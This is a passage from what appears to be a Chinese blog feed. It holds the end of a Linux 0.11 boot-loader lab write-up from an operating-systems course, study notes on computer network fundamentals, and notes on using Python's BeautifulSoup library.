<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ./run</span></div></pre></td></tr></table></figure>
</li>
<li><p>实验结果：<br><img src="/images/5193451504417795652-wm.png" alt="实验楼"></p>
</li>
</ol>
<hr>
<h3 id="setup-s获取硬件参数，并显示："><a href="#setup-s获取硬件参数，并显示：" class="headerlink" title="setup.s获取硬件参数，并显示："></a><code>setup.s</code>获取硬件参数，并显示：</h3><ol>
<li><p>进入目录<code>~/oslab/linux-0.11/boot/</code>，执行<code>$ vi setup.s</code>，在末尾添加函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">...</div><div class="line">print_hex:</div><div class="line">	mov bp,sp</div><div class="line">	add bp,#2</div><div class="line">	mov cx,#4</div><div class="line">	mov dx,(bp)</div><div class="line">print_digit:</div><div class="line">	rol dx,#4</div><div class="line">	mov ax,#0xe0f</div><div class="line">	and al,dl</div><div class="line">	add al,#0x30</div><div class="line">	cmp al,#0x3a</div><div class="line">	jl outp</div><div class="line">	add al,#0x07</div><div class="line">outp:</div><div class="line">	int 0x10</div><div class="line">	loop print_digit</div><div class="line">	ret</div><div class="line">print_nl:</div><div class="line">	mov ax,#0xe0d</div><div class="line">	int 0x10</div><div class="line">	mov al,#0xa</div><div class="line">	int 0x10</div><div class="line">	</div><div class="line">.text</div><div class="line">endtext:</div><div class="line">.data</div><div class="line">enddata:</div><div class="line">.bss</div><div class="line">endbss:</div></pre></td></tr></table></figure>
</li>
<li><p>进入目录<code>~/oslab/linux-0.11/boot/</code>，执行<code>$ vi setup.s</code>，在获取内存大小的模块添加代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">...</div><div class="line">! Get memory size (extended mem, kB)</div><div class="line"></div><div class="line">    	mov	ah,#0x88</div><div class="line">    	int	0x15</div><div class="line">    	mov	[2],ax</div><div class="line"></div><div class="line">        mov     ah,#0x03                ! read cursor pos</div><div class="line">        xor     bh,bh</div><div class="line">        int     0x10</div><div class="line"></div><div class="line">        mov     cx,#14</div><div class="line">        mov     bx,#0x0007              ! page 0, attribute 7 (normal)</div><div class="line">        mov     bp,#memory</div><div class="line">        mov     ax,#0x1301              ! write string, move cursor</div><div class="line">        int     0x10</div><div class="line"></div><div class="line">        push [2]</div><div class="line">        call print_hex</div><div class="line">    	mov ax,#0xe4b</div><div class="line">    	int 0x10			! output &apos;K&apos;</div><div class="line">    	mov al,#0x42</div><div class="line">    	int 0x10			! output &apos;B&apos;</div><div class="line">        call print_nl</div><div class="line">        pop [2]</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure>
</li>
<li><p>进入目录<code>~/oslab/linux-0.11/</code>，执行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> make BootImage</span></div></pre></td></tr></table></figure>
</li>
<li><p>进入目录<code>~/oslab/</code>，执行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ./run</span></div></pre></td></tr></table></figure>
</li>
<li><p>实验结果<br><img src="/images/5193451504420514329-wm.png" alt="实验楼"></p>
</li>
</ol>
<hr>
<h2 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a>实验报告</h2><ol>
<li>计算机启动时，BIOS把中断表置于内存位置为0的地方，导致引导时必须把system代码先置于其他地方（0x10000），拷贝中断表后，再挪回地址0处。替代方案：BIOS可把中断表放置在其余不影响引导、且方便获取的地方。</li>
<li>由于实模式的地址计算方式保守，导致内存可寻址范围只有1MB，使得需要进入保护模式，才能采用32位地址寻址。替代方案：改变硬件的地址计算方式，使之直接采用32位地址寻址。 </li>
</ol>
<hr>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><ul>
<li><a href="http://gaufoo.com/code/lab1/bootsect.s" download="bootsect.s">bootsect.s</a></li>
<li><a href="http://gaufoo.com/code/lab1/setup.s" download="setup.s">setup.s</a></li>
<li><a href="http://gaufoo.com/code/lab1/build.c" download="build.c">build.c</a></li>
</ul>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HIT操作系统课程第一个实验。&lt;/p&gt;
    
    </summary>
    
      <category term="原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/"/>
    
      <category term="操作系统" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="原理" scheme="http://gaufoo.com/tags/%E5%8E%9F%E7%90%86/"/>
    
      <category term="操作系统" scheme="http://gaufoo.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络学习笔记（一）</title>
    <link href="http://gaufoo.com/2017/09/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://gaufoo.com/2017/09/03/计算机网络学习笔记（一）/</id>
    <published>2017-09-02T17:57:00.000Z</published>
    <updated>2017-09-06T09:18:14.944Z</updated>
    
    <content type="html"><![CDATA[<p>记录以备后用</p>
<a id="more"></a>
<hr>
<h2 id="计算机网络定义"><a href="#计算机网络定义" class="headerlink" title="计算机网络定义"></a>计算机网络定义</h2><ul>
<li>计算机网络就是<strong>互连</strong>的、<strong>自治</strong>的计算机集合。<ul>
<li>自治：无主从关系</li>
<li>互连：通过通信链路互联互通</li>
</ul>
</li>
<li>距离远、数量大时，通过<strong>交换网络</strong>互联主机。</li>
</ul>
<hr>
<h2 id="Internet-定义"><a href="#Internet-定义" class="headerlink" title="Internet 定义"></a>Internet 定义</h2><h3 id="组成细节角度"><a href="#组成细节角度" class="headerlink" title="组成细节角度"></a>组成细节角度</h3><ul>
<li>全球最大的<strong>互联网络</strong><ul>
<li>由ISP(Internet Service Provider)网络互连的“网络之网络”</li>
</ul>
</li>
<li>数以百万计的互连的<strong>计算设备</strong>集合<ul>
<li>主机(hosts) == 端系统(end systems)</li>
<li>运行各种网络应用</li>
</ul>
</li>
<li>通信链路<ul>
<li>光纤、铜缆、无线电、卫星……</li>
</ul>
</li>
<li>分组交换：转发分组(数据包)<ul>
<li>路由器(routers)</li>
<li>交换机(switches)</li>
</ul>
</li>
</ul>
<h3 id="服务提供角度"><a href="#服务提供角度" class="headerlink" title="服务提供角度"></a>服务提供角度</h3><ul>
<li>为网络应用提供通信服务<ul>
<li>Web, VolP, email, 电子商务, 社交网络</li>
</ul>
</li>
<li>为网络应用提供编程接口(API)<ul>
<li>支持应用程序“连接”Internet, 发送/接收数据</li>
<li>提供类似于邮政系统的数据传输服务</li>
</ul>
</li>
</ul>
<hr>
<h2 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h2><h3 id="类比"><a href="#类比" class="headerlink" title="类比"></a>类比</h3><ul>
<li>交通系统中的交通规则</li>
<li>人类交谈作为信息交换的过程，同样包括交流时间、问题请教、人员引荐等</li>
<li>网络通信<ul>
<li>通信<strong>主体</strong>：机器，而非人</li>
<li>交换“<strong>数字化</strong>”或“<strong>电子化</strong>”信息</li>
<li>所有通信过程必须遵循某些规则：<strong>协议</strong></li>
</ul>
</li>
</ul>
<h3 id="要素"><a href="#要素" class="headerlink" title="要素"></a>要素</h3><ul>
<li><strong>语法(Syntax)</strong><ul>
<li>数据与控制信息的结构或格式</li>
<li>信号电平</li>
</ul>
</li>
<li><strong>语义(Semantics)</strong><ul>
<li>需要发出何种控制信息</li>
<li>完成何种动作以及做出何种响应</li>
<li>差错控制</li>
</ul>
</li>
<li><strong>时序(Timing)</strong><ul>
<li>事件顺序</li>
<li>速度匹配</li>
</ul>
</li>
</ul>
<h3 id="Internet-协议标准"><a href="#Internet-协议标准" class="headerlink" title="Internet 协议标准"></a>Internet 协议标准</h3><ul>
<li>RFC：Request for Comments</li>
<li>IETF：互联网工程任务组(Internet Engineering Task Force)</li>
</ul>
<hr>
<h2 id="计算机网络结构"><a href="#计算机网络结构" class="headerlink" title="计算机网络结构"></a>计算机网络结构</h2><h3 id="网络边缘"><a href="#网络边缘" class="headerlink" title="网络边缘"></a>网络边缘</h3><ul>
<li>主机（端系统）</li>
<li>网络应用，如：Web，email</li>
<li>模型：<ul>
<li>客户/服务器（client/server）应用模型</li>
<li>对等（peer-peer，P2P）应用模型</li>
</ul>
</li>
</ul>
<h3 id="接入网络、物理介质"><a href="#接入网络、物理介质" class="headerlink" title="接入网络、物理介质"></a>接入网络、物理介质</h3><ul>
<li>有线或无线通信链路<ul>
<li>住宅（家庭）接入网络</li>
<li>机构接入网络（学校、企业等）</li>
<li>移动接入网络</li>
</ul>
</li>
<li>用户关心<ul>
<li>带宽（bps）</li>
<li>共享/独占</li>
</ul>
</li>
<li>类型<ul>
<li>电缆网络 - 频分多路复用</li>
<li>数字用户线路（DSL） - 电话线</li>
<li>Ethernet，端系统通常直接连接以太网交换机（switch）</li>
<li>无线接入网络 - 通过基站或“接入点”<ul>
<li>无线局域网（LANs）</li>
<li>广域无线接入 - 电信运营商（蜂窝网）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="网络核心（核心网络）"><a href="#网络核心（核心网络）" class="headerlink" title="网络核心（核心网络）"></a>网络核心（核心网络）</h3><ul>
<li>互连的路由器（或分组转发设备）</li>
<li>关键功能：<ul>
<li>路由（routing）</li>
<li>转发（forwarding）</li>
</ul>
</li>
</ul>
<hr>
<h2 id="Internet-结构"><a href="#Internet-结构" class="headerlink" title="Internet 结构"></a>Internet 结构</h2><ul>
<li>端系统通过<strong>接入ISP</strong>（access ISPs）连接到 Internet<ul>
<li>家庭、公司、大学 ISPs</li>
</ul>
</li>
<li>区域网络（regional networks）连接到<strong>接入ISP</strong>和运营商ISP</li>
<li>每一个<strong>接入ISP</strong>连接到大型ISP</li>
<li>大型ISP网络必须互连</li>
<li>网络中心：少数互连的大型网络<ul>
<li><strong>“一级”（tier-1）商业ISPs</strong>（如：网通、电信、Sprint、AT&amp;T），提供国家或国际范围的覆盖</li>
<li><strong>内容提供商网络</strong>（content provider network，如：Google），私有网络，连接其数据中心与Internet</li>
</ul>
</li>
</ul>
<hr>
<h2 id="数据交换"><a href="#数据交换" class="headerlink" title="数据交换"></a>数据交换</h2><h3 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h3><ul>
<li>典型：电话网络</li>
<li>阶段<ul>
<li>建立连接</li>
<li>通信</li>
<li>释放资源</li>
</ul>
</li>
<li>特点：独占资源 </li>
<li>解决：多路复用<ul>
<li>特点<ul>
<li>将资源片分配给各路“呼叫”</li>
<li>每路呼叫独占所分配资源</li>
<li>资源片可能闲置（idle）</li>
</ul>
</li>
<li>方法<ul>
<li>频分多路复用（“frequency” FDM）</li>
<li>时分多路复用（“time” TDM）</li>
<li>波分多路复用（“wavelength” WDM）</li>
<li>码分多路复用（“code” CDM）<ul>
<li>每个用户分配一个<strong>码片序列</strong></li>
<li>编码信号 = （原始数据）×（码片序列）</li>
<li>各用户码片序列互相<strong>正交</strong>（orthogonal）</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="报文交换"><a href="#报文交换" class="headerlink" title="报文交换"></a>报文交换</h3><ul>
<li>报文：源（应用）发送信息整体</li>
</ul>
<h3 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h3><ul>
<li>分组：报文分拆出来的一系列相对较小的数据包</li>
<li>分组交换需要报文的拆分与重组</li>
<li>产生额外开销</li>
</ul>
<h3 id="报文-vs-分组"><a href="#报文-vs-分组" class="headerlink" title="报文 vs 分组"></a>报文 vs 分组</h3><ul>
<li>两者都是存储转发方式，区别：报文 - 完整报文，分组 - 较小的分组</li>
<li>报文：M bits 链路带宽：R bps 分组长度：L bits 路由器数：n<ul>
<li>分组交换：T = M/R + nL/R</li>
<li>报文交换：T = (n + 1)M/R</li>
</ul>
</li>
<li>分组交换允许更多用户同时使用网络，网络资源充分共享</li>
<li>分组交换缺陷<ol>
<li>适用于突发数据传输网络 </li>
<li>可能发生拥塞（congestion）：分组延迟和丢失 </li>
<li>无电路级性能保障。</li>
</ol>
</li>
</ul>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录以备后用&lt;/p&gt;
    
    </summary>
    
      <category term="原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/"/>
    
      <category term="计算机网络" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="原理" scheme="http://gaufoo.com/tags/%E5%8E%9F%E7%90%86/"/>
    
      <category term="网络" scheme="http://gaufoo.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>Python之BeautifulSoup库学习笔记</title>
    <link href="http://gaufoo.com/2017/09/01/Python%E4%B9%8BBeautifulSoup%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://gaufoo.com/2017/09/01/Python之BeautifulSoup库学习笔记/</id>
    <published>2017-08-31T16:44:09.000Z</published>
    <updated>2017-09-06T09:17:36.587Z</updated>
    
    <content type="html"><![CDATA[<p>记录以备后用</p>
<a id="more"></a>
<hr>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(<span class="string">'&lt;p&gt;data&lt;/p&gt;'</span>, <span class="string">'html.parser'</span>)</div></pre></td></tr></table></figure>
<hr>
<h2 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h2><ul>
<li><p><code>Tag</code>：标签，最基本的信息组织单元，分别用&lt;&gt;和&lt;/&gt;标明开头和结尾</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(<span class="string">'&lt;b class="boldest"&gt;Extremely bold&lt;/b&gt;'</span>, <span class="string">'html.parser'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag = soup.b</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>type(tag)</div><div class="line"><span class="comment"># &lt;class 'bs4.element.Tag'&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>Name</code>：标签的名字，<code>&lt;p&gt;…&lt;/p&gt;</code>的名字是’p’，格式：<code>&lt;tag&gt;.name</code></p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag.name</div><div class="line"><span class="comment"># u'b'</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag.name = <span class="string">"blockquote"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag</div><div class="line"><span class="comment"># &lt;blockquote class="boldest"&gt;Extremely bold&lt;/blockquote&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>Attributes</code>：标签的属性，字典形式组织，格式：<code>&lt;tag&gt;.attrs</code></p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag[<span class="string">'class'</span>]</div><div class="line"><span class="comment"># u'boldest'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag.attrs</div><div class="line"><span class="comment"># &#123;u'class': u'boldest'&#125;</span></div></pre></td></tr></table></figure>
<blockquote>
<p>tag的属性可以被添加,删除或修改</p>
</blockquote>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag[<span class="string">'class'</span>] = <span class="string">'verybold'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag[<span class="string">'id'</span>] = <span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag</div><div class="line"><span class="comment"># &lt;blockquote class="verybold" id="1"&gt;Extremely bold&lt;/blockquote&gt;</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> tag[<span class="string">'class'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> tag[<span class="string">'id'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag</div><div class="line"><span class="comment"># &lt;blockquote&gt;Extremely bold&lt;/blockquote&gt;</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag[<span class="string">'class'</span>]</div><div class="line"><span class="comment"># KeyError: 'class'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(tag.get(<span class="string">'class'</span>))</div><div class="line"><span class="comment"># None</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>NavigableString</code>：标签内非属性字符串，&lt;&gt;…&lt;/&gt;中字符串，格式：<code>&lt;tag&gt;.string</code></p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>tag.string</div><div class="line"><span class="comment"># u'Extremely bold'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>type(tag.string)</div><div class="line"><span class="comment"># &lt;class 'bs4.element.NavigableString'&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>Comment</code>：标签内字符串的注释部分，一种特殊的NavigableString类型</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>markup = <span class="string">"&lt;b&gt;&lt;!--Hey, buddy. Want to buy a used parser?--&gt;&lt;/b&gt;"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(markup, <span class="string">'html.parser'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>comment = soup.b.string</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>type(comment)</div><div class="line"><span class="comment"># &lt;class 'bs4.element.Comment'&gt;</span></div></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="简单遍历"><a href="#简单遍历" class="headerlink" title="简单遍历"></a>简单遍历</h2><ul>
<li><p>只获得第一个tag</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.head</div><div class="line"><span class="comment"># &lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.title</div><div class="line"><span class="comment"># &lt;title&gt;The Dormouse's story&lt;/title&gt;</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.body.b</div><div class="line"><span class="comment"># &lt;b&gt;The Dormouse's story&lt;/b&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>获得所有tag</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.find_all(<span class="string">'a'</span>)</div><div class="line"><span class="comment"># [&lt;a class="sister" href="http://example.com/elsie" id="link1"&gt;Elsie&lt;/a&gt;,</span></div><div class="line"><span class="comment">#  &lt;a class="sister" href="http://example.com/lacie" id="link2"&gt;Lacie&lt;/a&gt;,</span></div><div class="line"><span class="comment">#  &lt;a class="sister" href="http://example.com/tillie" id="link3"&gt;Tillie&lt;/a&gt;]</span></div></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="精确遍历"><a href="#精确遍历" class="headerlink" title="精确遍历"></a>精确遍历</h2><p><code>find_all(name, attrs, recursive, text, **kwargs)</code></p>
<ul>
<li><p><code>name</code>：name 参数可以查找所有名字为 name 的 tag</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.find_all(<span class="string">"title"</span>)</div><div class="line"><span class="comment"># [&lt;title&gt;The Dormouse's story&lt;/title&gt;]</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>keywork</code>：搜索时会把该参数当作指定名字 tag 的<strong>属性</strong>来搜索</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.find_all(id=<span class="string">'link2'</span>)</div><div class="line"><span class="comment"># [&lt;a class="sister" href="http://example.com/lacie" id="link2"&gt;Lacie&lt;/a&gt;]</span></div></pre></td></tr></table></figure>
<p>  参数值为<code>True</code>，查找所有包含 id 属性的 tag</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.find_all(id=<span class="keyword">True</span>)</div><div class="line"><span class="comment"># [&lt;a class="sister" href="http://example.com/elsie" id="link1"&gt;Elsie&lt;/a&gt;,</span></div><div class="line"><span class="comment">#  &lt;a class="sister" href="http://example.com/lacie" id="link2"&gt;Lacie&lt;/a&gt;,</span></div><div class="line"><span class="comment">#  &lt;a class="sister" href="http://example.com/tillie" id="link3"&gt;Tillie&lt;/a&gt;]</span></div></pre></td></tr></table></figure>
<p>  <code>class_</code>：搜索有指定CSS类名的 tag。因为 class 是 python 的关键字，需要加下横线以区分</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.find_all(<span class="string">"a"</span>, class_=<span class="string">"sister"</span>)</div><div class="line"><span class="comment"># [&lt;a class="sister" href="http://example.com/elsie" id="link1"&gt;Elsie&lt;/a&gt;,</span></div><div class="line"><span class="comment">#  &lt;a class="sister" href="http://example.com/lacie" id="link2"&gt;Lacie&lt;/a&gt;,</span></div><div class="line"><span class="comment">#  &lt;a class="sister" href="http://example.com/tillie" id="link3"&gt;Tillie&lt;/a&gt;]</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>attrs</code>：定义一个字典参数来搜索包含特殊属性的 tag</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>data_soup.find_all(attrs=&#123;<span class="string">"data-foo"</span>: <span class="string">"value"</span>&#125;)</div><div class="line"><span class="comment"># [&lt;div data-foo="value"&gt;foo!&lt;/div&gt;]</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>text</code>：搜索文档中的字符串内容</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.find_all(<span class="string">"a"</span>, text=<span class="string">"Elsie"</span>)</div><div class="line"><span class="comment"># [&lt;a href="http://example.com/elsie" class="sister" id="link1"&gt;Elsie&lt;/a&gt;]</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>limit</code>：限制返回结果的<strong>数量</strong></p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.find_all(<span class="string">"a"</span>, limit=<span class="number">2</span>)</div><div class="line"><span class="comment"># [&lt;a class="sister" href="http://example.com/elsie" id="link1"&gt;Elsie&lt;/a&gt;,</span></div><div class="line"><span class="comment">#  &lt;a class="sister" href="http://example.com/lacie" id="link2"&gt;Lacie&lt;/a&gt;]</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>recursive</code>：value为False时，搜索tag的直接子节点</p>
</li>
</ul>
<hr>
<p><code>find(name, attrs, recursive, text, **kwargs)</code></p>
<p>与<code>find_all()</code>的区别：</p>
<ul>
<li><p><code>find()</code>只得到一个结果，<code>find_all()</code>得到结果的列表</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.find_all(<span class="string">'title'</span>, limit=<span class="number">1</span>)</div><div class="line"><span class="comment"># [&lt;title&gt;The Dormouse's story&lt;/title&gt;]</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>soup.find(<span class="string">'title'</span>)</div><div class="line"><span class="comment"># &lt;title&gt;The Dormouse's story&lt;/title&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>find_all()</code>方法没有找到目标是返回空列表，<code>find()</code> 方法找不到目标时,返回 None</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.find(<span class="string">"nosuchtag"</span>))</div><div class="line"><span class="comment"># None</span></div></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="标签树的下行遍历"><a href="#标签树的下行遍历" class="headerlink" title="标签树的下行遍历"></a>标签树的下行遍历</h2><ul>
<li><code>.contents</code>：子节点的<strong>列表</strong>，将<tag>所有儿子节点存入列表</tag></li>
<li><code>.children</code>： 子节点的<strong>迭代类型</strong>，与<code>.contents</code>类似，用于循环遍历儿子节点</li>
<li><code>.descendants</code>： 子孙节点的<strong>迭代类型</strong>，包含所有子孙节点，用于循环遍历</li>
</ul>
<hr>
<h2 id="标签树的上行遍历"><a href="#标签树的上行遍历" class="headerlink" title="标签树的上行遍历"></a>标签树的上行遍历</h2><ul>
<li><code>.parent</code>： 节点的父亲标签</li>
<li><code>.parents</code>： 节点先辈标签的<strong>迭代类型</strong>，用于循环遍历先辈节点</li>
</ul>
<hr>
<h2 id="标签树的平行遍历"><a href="#标签树的平行遍历" class="headerlink" title="标签树的平行遍历"></a>标签树的平行遍历</h2><ul>
<li><code>.next_sibling</code>： 返回按照HTML文本顺序的下一个平行节点标签</li>
<li><code>.previous_sibling</code>： 返回按照HTML文本顺序的上一个平行节点标签</li>
<li><code>.next_siblings</code>： <strong>迭代类型</strong>，返回按照HTML文本顺序的后续所有平行节点标签</li>
<li><code>.previous_siblings</code>： <strong>迭代类型</strong>，返回按照HTML文本顺序的前续所有平行节点标签</li>
</ul>
<hr>
<h2 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.prettify())</div></pre></td></tr></table></figure>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录以备后用&lt;/p&gt;
    
    </summary>
    
      <category term="编程" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="Python" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/Python/"/>
    
    
      <category term="Python" scheme="http://gaufoo.com/tags/Python/"/>
    
